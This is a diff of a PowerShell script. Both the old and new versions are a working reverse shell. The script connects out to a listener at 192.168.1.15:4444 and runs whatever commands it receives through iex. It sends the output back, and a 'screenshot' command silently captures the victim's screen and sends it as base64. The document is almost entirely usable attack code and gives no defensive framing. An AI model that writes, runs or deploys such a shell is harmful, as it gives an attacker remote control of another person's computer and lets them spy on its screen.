@@ -1,56 +1,43 @@
-# --- THE "LOCK IN" PRIMITIVE SHELL ---
+# --- ATOMIC LOCK-IN ---
 $ip = '192.168.1.15'
 $port = 4444
 
-# No functions, no extra assemblies at the top. 
-# We load them only if the command 'screenshot' is typed.
+# 1. SIMPLEST CONNECTION
+$c = New-Object System.Net.Sockets.TCPClient
+$c.Connect($ip, $port)
+$s = $c.GetStream()
+$r = New-Object System.IO.StreamReader($s)
+$w = New-Object System.IO.StreamWriter($s)
+$w.AutoFlush = $true
 
-try {
-    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-    $stream = $client.GetStream()
-    $writer = New-Object System.IO.StreamWriter($stream)
-    $writer.AutoFlush = $true
-    $reader = New-Object System.IO.StreamReader($stream)
+$w.WriteLine("--- ATOMIC SHELL ACTIVE ---")
 
-    $writer.WriteLine("--- Connection Established ---")
+# 2. THE ONLY LOOP
+while($c.Connected) {
+    $w.Write("PS " + (Get-Location).Path + "> ")
+    $raw = $r.ReadLine()
+    if ($null -eq $raw) { break }
+    
+    $cmd = $raw.Trim()
+    if ($cmd -eq "exit") { break }
 
-    while($client.Connected) {
-        $writer.Write("PS " + (Get-Location).Path + "> ")
-        $line = $reader.ReadLine()
-        if ($null -eq $line) { break }
-        $cmd = $line.Trim()
-
-        if ($cmd -eq "exit") { break }
-
-        # LOGIC BRANCH
-        if ($cmd -eq "screenshot") {
-            $out = try {
-                # Load graphics ONLY right now
-                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-                $sr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                $bm = New-Object System.Drawing.Bitmap($sr.Width, $sr.Height)
-                $g  = [System.Drawing.Graphics]::FromImage($bm)
-                $g.CopyFromScreen($sr.Location, [System.Drawing.Point]::Empty, $sr.Size)
-                $ms = New-Object System.IO.MemoryStream
-                $bm.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-                $str = [Convert]::ToBase64String($ms.ToArray())
-                $g.Dispose(); $bm.Dispose(); $ms.Dispose()
-                $str 
-            } catch { "Error: $($_.Exception.Message)" }
-        } 
-        else {
-            # Run command
-            $out = try { iex $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
-        }
-
-        # Send result
-        $writer.WriteLine($out)
+    # 3. DIRECT BRANCHING
+    if ($cmd -eq "screenshot") {
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+        $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
+        $mem = New-Object System.IO.MemoryStream
+        $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+        $out = [Convert]::ToBase64String($mem.ToArray())
+        $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
+    } 
+    else {
+        # The most basic way to run a command
+        $out = iex $cmd 2>&1 | Out-String
     }
-} catch {
-    # If it crashes, this keeps the window open
-    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Yellow
-    Write-Host "Press any key to exit..."
-    $null = [System.Console]::ReadKey()
-} finally {
-    if ($client) { $client.Close() }
+
+    $w.WriteLine($out)
 }
+$c.Close()
